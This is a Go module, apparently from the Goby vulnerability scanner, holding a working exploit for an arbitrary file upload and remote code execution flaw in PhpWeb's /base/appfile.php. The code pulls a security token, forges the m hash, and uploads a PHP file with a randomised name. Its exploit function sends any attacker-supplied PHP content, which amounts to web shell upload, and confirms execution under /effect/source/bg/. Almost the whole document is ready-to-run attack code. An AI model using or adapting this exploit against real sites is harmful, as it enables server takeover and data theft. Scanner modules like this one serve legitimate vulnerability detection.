package exploits

import (
	"crypto/md5"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"math/rand"
	"regexp"
	"strconv"
	"strings"
)

func init() {
	expJson := `{
    "Name": "phpweb appfile.php arbitrarily file upload RCE",
    "Description": "Phpweb ",
    "Product": "phpweb",
    "Homepage": "https://www.phpweb.com.cn/",
    "DisclosureDate": "2021-07-15",
    "Author": "corp0ra1@qq.com",
    "FofaQuery": "",
    "GobyQuery": "app=\"PHPWEB\"",
    "Level": "3",
    "Impact": "<p>Attackers can inherit the permissions of web server program, execute system commands or read and write files, reverse shell, control the whole website, and even control the whole server</p>",
    "Recommandation": "<p>Update the latest version</p>",
    "References": [
        "https://m4tir.github.io/Phpweb-Reception-Getshell"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "fileContent",
            "type": "input",
            "value": "<?php echo md5(1);unlink(__FILE__);?>",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": null,
    "ExploitSteps": null,
    "Tags": [
        "rce"
    ],
    "CVEIDs": null,
    "CVSSScore": "9.8",
    "AttackSurfaces": {
        "Application": [
            "phpweb"
        ],
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Disable": false,
    "PocId": "10241",
    "Recommendation": ""
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			k := ""
			t := ""
			m := ""
			cfg1 := httpclient.NewPostRequestConfig("/base/post.php")
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg1.Data = "act=appcode"
			if resp1, err := httpclient.DoHttpRequest(u, cfg1); err == nil {
				if result := regexp.MustCompile(`k=(\S+)&t=(\S+)`).FindStringSubmatch(resp1.Utf8Html); len(result) > 2 {
					k = result[1]
					t = result[2]
				}
			}
			if k == "" && t == "" {
				return false
			}
			m = fmt.Sprintf("%x", md5.Sum([]byte(k+t)))

			cfg2 := httpclient.NewPostRequestConfig("/base/appfile.php")
			cfg2.VerifyTls = false
			cfg2.FollowRedirect = false

			boundary := goutils.RandomHexString(16)
			contentType := "multipart/form-data;boundary=-" + boundary
			cfg2.Header.Store("Content-Type", contentType)

			postData := `---boundary
Content-Disposition: form-data; name="file"; filename="%s"
Content-Type: application/octet-stream

%s
---boundary
Content-Disposition: form-data; name="t"

%s
---boundary
Content-Disposition: form-data; name="m"

%s
---boundary
Content-Disposition: form-data; name="act"

upload
---boundary
Content-Disposition: form-data; name="r_size"

%d
---boundary
Content-Disposition: form-data; name="submit"

%s
---boundary
`
			postData = strings.ReplaceAll(postData, "boundary", boundary)
			postData = strings.ReplaceAll(postData, "\n", "\r\n")
			fileName := goutils.RandomHexString(4) + ".php"
			checkStr := strconv.Itoa(rand.Intn(100))
			payload := fmt.Sprintf("<?php echo md5(%s);unlink(__FILE__);?>", checkStr)
			r_size := len(payload)
			postData = fmt.Sprintf(postData, fileName, payload, t, m, r_size, goutils.RandomHexString(1))
			cfg2.Data = postData
			if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
				if strings.Contains(resp2.Utf8Html, "OK") {
					checkUri := "/effect/source/bg/" + fileName
					if resp3, err := httpclient.SimpleGet(u.FixedHostInfo + checkUri); err == nil {
						if regexp.MustCompile(fmt.Sprintf("%x", md5.Sum([]byte(checkStr)))).MatchString(resp3.Utf8Html) {
							return true
						}
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			k := ""
			t := ""
			m := ""
			cfg1 := httpclient.NewPostRequestConfig("/base/post.php")
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg1.Data = "act=appcode"
			if resp1, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil {
				if result := regexp.MustCompile(`k=(\S+)&t=(\S+)`).FindStringSubmatch(resp1.Utf8Html); len(result) > 2 {
					k = result[1]
					t = result[2]
				}
			}
			if k == "" && t == "" {
				expResult.Success = false
				expResult.Output = "ERROR: Security check error.\nplease try again"
				return expResult
			}
			m = fmt.Sprintf("%x", md5.Sum([]byte(k+t)))

			cfg2 := httpclient.NewPostRequestConfig("/base/appfile.php")
			cfg2.VerifyTls = false
			cfg2.FollowRedirect = false

			boundary := goutils.RandomHexString(16)
			contentType := "multipart/form-data;boundary=-" + boundary
			cfg2.Header.Store("Content-Type", contentType)

			postData := `---boundary
Content-Disposition: form-data; name="file"; filename="%s"
Content-Type: application/octet-stream

%s
---boundary
Content-Disposition: form-data; name="t"

%s
---boundary
Content-Disposition: form-data; name="m"

%s
---boundary
Content-Disposition: form-data; name="act"

upload
---boundary
Content-Disposition: form-data; name="r_size"

%d
---boundary
Content-Disposition: form-data; name="submit"

%s
---boundary
`
			postData = strings.ReplaceAll(postData, "boundary", boundary)
			postData = strings.ReplaceAll(postData, "\n", "\r\n")
			fileName := goutils.RandomHexString(4) + ".php"
			payload := ss.Params["fileContent"].(string)
			r_size := len(payload)
			postData = fmt.Sprintf(postData, fileName, payload, t, m, r_size, goutils.RandomHexString(1))
			cfg2.Data = postData
			if resp2, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil {
				if strings.Contains(resp2.Utf8Html, "OK") {
					checkUri := "/effect/source/bg/" + fileName
					if resp3, err := httpclient.SimpleGet(expResult.HostInfo.FixedHostInfo + checkUri); err == nil {
						if resp3.StatusCode == 200 {
							expResult.Success = true
							expResult.Output = "the url:" + (expResult.HostInfo.FixedHostInfo + checkUri) + "\nthe reuslt:" + resp3.Utf8Html
							return expResult
						}
					}
				} else {
					expResult.Success = false
					expResult.Output = resp2.Utf8Html
				}
			}
			return expResult
		},
	))
}
